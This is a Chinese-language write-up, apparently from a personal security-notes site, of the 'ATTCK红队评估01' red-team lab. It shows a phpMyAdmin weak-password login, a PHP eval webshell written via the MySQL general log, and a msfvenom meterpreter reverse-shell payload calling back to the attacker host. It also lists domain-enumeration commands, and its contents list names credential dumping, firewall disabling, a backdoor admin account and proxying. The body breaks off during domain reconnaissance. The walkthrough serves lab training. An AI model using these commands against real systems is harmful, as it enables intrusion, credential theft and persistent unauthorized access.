      允许 3389 端口放行netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_31" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_32" class="md-nav__link">
    <span class="md-ellipsis">
      可以添加一个用户备用啥的
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-user-username-password-add" class="md-nav__link">
    <span class="md-ellipsis">
      net user [username] [password] /add
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#administrators" class="md-nav__link">
    <span class="md-ellipsis">
      添加到Administrators用户组
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-localgroup-administrators-username-add" class="md-nav__link">
    <span class="md-ellipsis">
      net localgroup Administrators [username] /add
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_33" class="md-nav__link">
    <span class="md-ellipsis">
      激活用户
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-user-username-activeyes" class="md-nav__link">
    <span class="md-ellipsis">
      net user [username] /active:yes
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_34" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_35" class="md-nav__link">
    <span class="md-ellipsis">
      搭建代理–横向渗透
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win719216852c" class="md-nav__link">
    <span class="md-ellipsis">
      由于已经发现win7存在内网192.168.52的c段，搭建代理通道
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_36" class="md-nav__link">
    <span class="md-ellipsis">
      首先添加路由,并将会话切至后台
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_37" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#socks" class="md-nav__link">
    <span class="md-ellipsis">
      设置socks代理
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_38" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#proxychainsmsfsocksetcproxychains4conf" class="md-nav__link">
    <span class="md-ellipsis">
      再设置proxychains代理配置为msf的socks代理端口/etc/proxychains4.conf
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_39" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#52" class="md-nav__link">
    <span class="md-ellipsis">
      探测52网段主机存活
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_40" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_41" class="md-nav__link">
    <span class="md-ellipsis">
      拿下域控权限
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ATTCK红队评估02
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB%20Pilgrimage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTB Pilgrimage
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../tryhackme%20-%20Overpass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    tryhackme - Overpass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulhub%20%20%20%20DC-9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vulhub    DC-9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulhub%20%20%20%20DIGITALWORLD.LOCAL_%20BRAVERY/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vulhub    DIGITALWORLD.LOCAL: BRAVERY
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      拓扑环境如下：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      网卡配置如下：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kali-19216855123" class="md-nav__link">
    <span class="md-ellipsis">
      kali: 192.168.55.123
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win7-19216855130-19216852143" class="md-nav__link">
    <span class="md-ellipsis">
      win7: 192.168.55.130 &amp;&amp; 192.168.52.143(内网网卡)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win2003-19216852141" class="md-nav__link">
    <span class="md-ellipsis">
      win2003: 192.168.52.141(域内主机)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win2008-19216852138" class="md-nav__link">
    <span class="md-ellipsis">
      win2008: 192.168.52.138(域控)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      web渗透：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win7ip19216855130803306" class="md-nav__link">
    <span class="md-ellipsis">
      首先，进行主机发现，看到win7的主机ip为192.168.55.130,开放了80和3306端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#80php" class="md-nav__link">
    <span class="md-ellipsis">
      访问80端口，出现php探针页面
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web_1" class="md-nav__link">
    <span class="md-ellipsis">
      扫描web目录
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootrootphpmyadmin" class="md-nav__link">
    <span class="md-ellipsis">
      尝试用root/root弱口令登录phpmyadmin,成功登录
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#secure_file_privenullmysqld" class="md-nav__link">
    <span class="md-ellipsis">
      secure_file_prive=null，限制mysqld，不允许导入导出；
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      查询日志写入是否开启
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    <span class="md-ellipsis">
      开启日志并修改日志保存路径
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#set-global-general_log-on" class="md-nav__link">
    <span class="md-ellipsis">
      set global general_log = on;
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#set-global-general_log_filecphpstudywwwshellphp" class="md-nav__link">
    <span class="md-ellipsis">
      set global general_log_file='C:\\phpStudy\\WWW\\shell.php';
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#select-php-eval_postashell" class="md-nav__link">
    <span class="md-ellipsis">
      然后select '&lt;?php @eval($_POST[a]);?&gt;'写入shell至日志文件
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell" class="md-nav__link">
    <span class="md-ellipsis">
      尝试连接shell，成功连接
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#yxcmsgetshell" class="md-nav__link">
    <span class="md-ellipsis">
      也可以通过yxcms进行getshell
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    <span class="md-ellipsis">
      内网渗透：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msf" class="md-nav__link">
    <span class="md-ellipsis">
      制作一个msf木马并上传至目标服务器，并设置连接
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msfvenom-p-windowsmeterpreterreverse_tcp-lhost19216855123-lport5678-f-exe-o-shellexe" class="md-nav__link">
    <span class="md-ellipsis">
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#psmeterpretre-shellchcp-65001" class="md-nav__link">
    <span class="md-ellipsis">
      PS：meterpretre shell如果乱码，可以输入chcp 65001去除乱码
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#godorgip19216852143" class="md-nav__link">
    <span class="md-ellipsis">
      查看主机信息，可以看到该主机属于god.org域中，内网网卡ip为192.168.52.143
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#systeminfo" class="md-nav__link">
    <span class="md-ellipsis">
      systeminfo信息
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#getsystem" class="md-nav__link">
    <span class="md-ellipsis">
      尝试getsystem并成功
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    <span class="md-ellipsis">
      收集域内信息
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    <span class="md-ellipsis">
      查看域用户
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    <span class="md-ellipsis">
      查看域管
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    <span class="md-ellipsis">
      定位域控，域控一般都为时间服务器
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ip19216852138" class="md-nav__link">
    <span class="md-ellipsis">
      确定域控ip为192.168.52.138
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    <span class="md-ellipsis">
      接下来迁移会话进程
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hashdump" class="md-nav__link">
    <span class="md-ellipsis">
      hashdump
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ps-ridlm-hash-nt-hash-rid-windows-linux-uidgid-500-administrator501-guest-lm-hash-nt-hash-hash-cmd5" class="md-nav__link">
    <span class="md-ellipsis">
      PS:格式是：用户名称: RID:LM-HASH 值: NT-HASH 值，rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等。而 lm 的 hash 和 nt 的 hash,都是对用户密码进行的加密，只不过加密方式不一样。复制其中一种加密的 hash 可以直接使用在线 cmd5 破解
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#systemload-kiwicreds_allhongrisec2019" class="md-nav__link">
    <span class="md-ellipsis">
      由于已经获得system权限，可以加载load kiwi模块，creds_all导出明文密码hongrisec@2019
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#33893389" class="md-nav__link">
    <span class="md-ellipsis">
      查看3389开放情况，并尝试打开3389,关闭防火墙，连接远程桌面
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netstat-an-findstr-3389" class="md-nav__link">
    <span class="md-ellipsis">
      netstat -an | findstr “3389”查看远程端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_27" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-00000000-f" class="md-nav__link">
    <span class="md-ellipsis">
      开启3389REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-11111111-f" class="md-nav__link">
    <span class="md-ellipsis">
      关闭3389REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f）
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_28" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_29" class="md-nav__link">
    <span class="md-ellipsis">
      关闭防火墙：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-server-2003-netsh-firewall-set-opmode-disable" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Server 2003 系统及之前版本netsh firewall set opmode disable
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-server-2003-netsh-advfirewall-set-allprofiles-state-off" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Server 2003 之后系统版本netsh advfirewall set allprofiles state off
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_30" class="md-nav__link">
    <span class="md-ellipsis">
      或者
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389-netsh-advfirewall-firewall-add-rule-nameremote-desktop-protocoltcp-dirin-localport3389-actionallow" class="md-nav__link">
    <span class="md-ellipsis">
      允许 3389 端口放行netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_31" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_32" class="md-nav__link">
    <span class="md-ellipsis">
      可以添加一个用户备用啥的
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-user-username-password-add" class="md-nav__link">
    <span class="md-ellipsis">
      net user [username] [password] /add
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#administrators" class="md-nav__link">
    <span class="md-ellipsis">
      添加到Administrators用户组
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-localgroup-administrators-username-add" class="md-nav__link">
    <span class="md-ellipsis">
      net localgroup Administrators [username] /add
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_33" class="md-nav__link">
    <span class="md-ellipsis">
      激活用户
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net-user-username-activeyes" class="md-nav__link">
    <span class="md-ellipsis">
      net user [username] /active:yes
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_34" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_35" class="md-nav__link">
    <span class="md-ellipsis">
      搭建代理–横向渗透
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win719216852c" class="md-nav__link">
    <span class="md-ellipsis">
      由于已经发现win7存在内网192.168.52的c段，搭建代理通道
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_36" class="md-nav__link">
    <span class="md-ellipsis">
      首先添加路由,并将会话切至后台
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_37" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#socks" class="md-nav__link">
    <span class="md-ellipsis">
      设置socks代理
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_38" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#proxychainsmsfsocksetcproxychains4conf" class="md-nav__link">
    <span class="md-ellipsis">
      再设置proxychains代理配置为msf的socks代理端口/etc/proxychains4.conf
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_39" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#52" class="md-nav__link">
    <span class="md-ellipsis">
      探测52网段主机存活
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_40" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_41" class="md-nav__link">
    <span class="md-ellipsis">
      拿下域控权限
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>ATTCK红队评估01</h1>

<h3 id="_1"><strong>拓扑环境如下：</strong></h3>
<h3 id="_2"><img alt="71844d4b6f701996110fbfee4665d6fc.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/71844d4b6f701996110fbfee4665d6fc.png" /></h3>
<h3 id="_3">网卡配置如下：</h3>
<h3 id="kali-19216855123">kali:  192.168.55.123</h3>
<h3 id="win7-19216855130-19216852143">win7:  192.168.55.130  &amp;&amp; 192.168.52.143(内网网卡)</h3>
<h3 id="win2003-19216852141">win2003:  192.168.52.141(域内主机)</h3>
<h3 id="win2008-19216852138">win2008:  192.168.52.138(域控)</h3>
<hr />
<h3 id="web"><strong>web渗透：</strong></h3>
<h3 id="win7ip19216855130803306">首先，进行主机发现，看到win7的主机ip为192.168.55.130,开放了80和3306端口</h3>
<h3 id="_4"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/07fcb8ede9dd5d90de705162c665e8aa.png" alt="07fcb8ede9dd5d90de705162c665e8aa.png" width="589" height="278" class="jop-noMdConv"></h3>
<h3 id="80php">访问80端口，出现php探针页面</h3>
<h3 id="_5"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/32bbf9e7bd2077c69e300b6438da01a5.png" alt="32bbf9e7bd2077c69e300b6438da01a5.png" width="657" height="472" class="jop-noMdConv"></h3>
<h3 id="web_1">扫描web目录</h3>
<h3 id="_6"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/89d1743aa69c60a3bfc2332d30c45539.png" alt="89d1743aa69c60a3bfc2332d30c45539.png" width="668" height="378" class="jop-noMdConv"></h3>
<h3 id="rootrootphpmyadmin">尝试用root/root弱口令登录phpmyadmin,成功登录</h3>
<h3 id="_7"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a92e1ad4c67c847125930debd53a68ca.png" alt="a92e1ad4c67c847125930debd53a68ca.png" width="698" height="344" class="jop-noMdConv"></h3>
<h3 id="secure_file_privenullmysqld">secure_file_prive=null，限制mysqld，不允许导入导出；</h3>
<h3 id="_8"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/fa53217ae23aa68f7a549833c052eef6.png" alt="fa53217ae23aa68f7a549833c052eef6.png" width="675" height="129" class="jop-noMdConv"></h3>
<h3 id="_9">查询日志写入是否开启</h3>
<h3 id="_10"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/67e97109aa6d408ac664c4721cad6c1b.png" alt="67e97109aa6d408ac664c4721cad6c1b.png" width="611" height="299" class="jop-noMdConv"></h3>
<h3 id="_11">开启日志并修改日志保存路径</h3>
<h3 id="set-global-general_log-on"><code>set global general_log = on;</code></h3>
<h3 id="set-global-general_log_filecphpstudywwwshellphp"><code>set global general_log_file='C:\\phpStudy\\WWW\\shell.php';</code></h3>
<h3 id="_12"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/aaa2218d2157402b5bcb8dca51183cdc.png" alt="aaa2218d2157402b5bcb8dca51183cdc.png" width="730" height="317" class="jop-noMdConv"></h3>
<h3 id="select-php-eval_postashell">然后<code>select '&lt;?php @eval($_POST[a]);?&gt;'</code>写入shell至日志文件</h3>
<h3 id="shell">尝试连接shell，成功连接</h3>
<h3 id="_13"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c54d71fc26fb24d5f4ce3104598e7fcf.png" alt="c54d71fc26fb24d5f4ce3104598e7fcf.png" width="757" height="300" class="jop-noMdConv"></h3>
<h3 id="yxcmsgetshell">也可以通过yxcms进行getshell</h3>
<hr />
<h3 id="_14">内网渗透：</h3>
<h3 id="msf">制作一个msf木马并上传至目标服务器，并设置连接</h3>
<h3 id="msfvenom-p-windowsmeterpreterreverse_tcp-lhost19216855123-lport5678-f-exe-o-shellexe"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe</code></h3>
<h3 id="_15"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1a559cb4fc3f9080f1027fc14928b1fc.png" alt="1a559cb4fc3f9080f1027fc14928b1fc.png" width="850" height="392" class="jop-noMdConv"></h3>
<h3 id="psmeterpretre-shellchcp-65001"><strong>PS：meterpretre shell如果乱码，可以输入<code>chcp 65001</code>去除乱码</strong></h3>
<h3 id="godorgip19216852143">查看主机信息，可以看到该主机属于<code>god.org</code>域中，内网网卡ip为192.168.52.143</h3>
<div class="highlight"><pre><span></span><code>C:\phpStudy\WWW&gt;ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : stu1
   Primary Dns Suffix  . . . . . . . : god.org
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : god.org

Ethernet adapter �������� 5:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #3
   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-B2
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::98c:bf05:1e5c:5fbb%26(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.55.130(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 721423401
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter ��������:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-A8
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::fcff:cf71:1487:9c27%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.52.143(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.52.2
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
   DNS Servers . . . . . . . . . . . : 192.168.52.138
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
</code></pre></div>
<h3 id="systeminfo">systeminfo信息</h3>
<div class="highlight"><pre><span></span><code>C:\phpStudy\WWW&gt;systeminfo
systeminfo

Host Name:                 STU1
OS Name:                   Microsoft Windows 7 专业版 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows 用户
Registered Organization:   
Product ID:                00371-177-0000061-85693
Original Install Date:     2019/8/25, 9:54:10
System Boot Time:          2023/2/1, 10:41:12
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             zh-cn;Chinese (China)
Input Locale:              zh-cn;Chinese (China)
Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,284 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,218 MB
Virtual Memory: In Use:    877 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    god.org
Logon Server:              \\OWA
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB2999226
                           [03]: KB958488
                           [04]: KB976902
Network Card(s):           5 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: 本地连接
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.52.143
                                 [02]: fe80::fcff:cf71:1487:9c27
                           [02]: TAP-Windows Adapter V9
                                 Connection Name: 本地连接 2
                                 Status:          Media disconnected
                           [03]: Microsoft Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 DHCP Enabled:    Yes
                                 DHCP Server:     255.255.255.255
                                 IP address(es)
                                 [01]: 169.254.129.186
                                 [02]: fe80::b461:ccad:e30f:81ba
                           [04]: TAP-Windows Adapter V9
                                 Connection Name: 本地连接 3
                                 Status:          Media disconnected
                           [05]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: 本地连接 5
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.55.130
                                 [02]: fe80::98c:bf05:1e5c:5fbb
</code></pre></div>
<h3 id="getsystem">尝试getsystem并成功</h3>
<h3 id="_16"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/b11b43d98e71ea34b1a8956cd7f412d9.png" alt="b11b43d98e71ea34b1a8956cd7f412d9.png" width="674" height="149" class="jop-noMdConv"></h3>
<div class="highlight"><pre><span></span><code>信息收集
ipconfig /all 查询本机IP段，所在域等
net config Workstation 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net user 本机用户列表
net localhroup administrators 本机管理员[通常含有域用户]
net user /domain 查询域用户
net user 用户名 /domain 获取指定用户的账户信息
net user /domain b404 pass 修改域内用户密码，需要管理员权限
net group /domain 查询域里面的工作组
net group 组名 /domain 查询域中的某工作组
net group “domain admins” /domain 查询域管理员列表
net group “domain controllers” /domain 查看域控制器(如果有多台)
net time /domain 判断主域，主域服务器都做时间服务器
ipconfig /all 查询本机IP段，所在域等
</code></pre></div>
<h3 id="_17"><strong>收集域内信息</strong></h3>
<h3 id="_18">查看域用户</h3>
<h3 id="_19"><strong><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c08c4728ee3497b4ec1b5d7f6d44e5a7.png" alt="c08c4728ee3497b4ec1b5d7f6d44e5a7.png" width="785" height="227" class="jop-noMdConv"></strong></h3>
<h3 id="_20">查看域管</h3>
